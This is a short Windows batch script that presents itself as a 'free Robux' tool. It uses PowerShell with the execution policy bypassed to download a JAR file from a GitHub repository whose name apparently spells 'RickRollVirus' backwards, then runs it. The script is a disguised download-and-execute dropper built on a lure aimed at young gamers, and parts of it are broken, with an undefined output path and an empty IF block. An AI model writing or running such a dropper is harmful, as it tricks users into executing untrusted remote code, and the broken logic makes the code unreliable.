@echo off
setlocal EnableExtensions

set "JAR_NAME=free_robux.jar"
set "JAR_URL=https://github.com/ItsNukea/suriVlloRkciR/raw/main/%JAR_NAME%"
set "DEST_DIR=%USERPROFILE%\Downloads"

IF EXIST "%DEST_DIR%%JAR_NAME%" (
) ELSE (
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "iwr -Uri '%JAR_URL%' -OutFile '%DEST_PATH%' -UseBasicParsing"
)

if errorlevel 1 (
  echo Download failed. Make sure to connect to the internet when running this file
  pause
  exit /b 1
)

cd %DEST_DIR%
java -jar %JAR_NAME%
pause

endlocal